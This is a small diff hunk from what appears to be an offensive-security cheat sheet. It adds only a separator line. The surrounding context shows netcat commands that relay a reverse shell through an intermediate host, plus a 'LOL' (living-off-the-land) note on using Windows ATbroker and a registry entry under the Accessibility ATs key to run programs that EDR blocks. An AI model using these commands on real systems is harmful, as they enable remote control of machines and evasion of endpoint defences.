@@ -49,6 +49,7 @@ nc -l -p <relayport> < relay1 | nc <tgtip> <tgtport> > relay1
 nc <relayip> <relayport>
 #routing reverse shell through relay host
 
+=======================================================================
 --# LOL #--
 #using tools such as ATbroker in Win can be a way to execute programs blocked by EDR
 reg add "HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Accessibility\ATs\<exe>"
